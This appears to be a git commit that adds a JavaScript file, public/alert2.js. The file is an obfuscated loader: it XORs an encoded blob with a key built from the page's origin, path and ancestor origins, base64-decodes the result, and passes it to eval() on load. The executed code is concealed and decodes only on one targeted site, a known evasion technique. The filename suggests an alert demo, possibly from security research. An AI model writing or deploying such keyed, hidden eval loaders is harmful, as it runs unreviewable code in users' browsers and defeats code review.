75668e77253d6844c91d3b665637ca36a15b6095
weizman <weizmangal@gmail.com>
2025-09-24 14:14:06 +0300

    Create alert2.js

---
+++ public/alert2.js
@@ -0,0 +1,23 @@
+function xorStrings(a, b) {
+    let result = '';
+    // Determine the length of the shorter string to avoid errors.
+    const len = Math.min(a.length, b.length);
+
+    for (let i = 0; i < len; i++) {
+        // Get the character codes (ASCII values) for the current characters
+        const charCodeA = a.charCodeAt(i);
+        const charCodeB = b.charCodeAt(i);
+
+        // Perform the bitwise XOR on the character codes
+        const xorResult = charCodeA ^ charCodeB;
+
+        // Convert the result back to a character and append it to the result string
+        result += String.fromCharCode(xorResult);
+    }
+
+    return result;
+}
+
+const key = JSON.stringify([location.origin, location.pathname, location.ancestorOrigins]);
+const href = 'OEoaGxkVXl9XWwQbBwFCAlNIRxtJBAMPDR8FBB1IEQIBBglBAQYDS0RIRkBGF0pARVZJRxUEAFxbS0ADBlwFEQ==';
+eval(atob(xorStrings(key, href)));
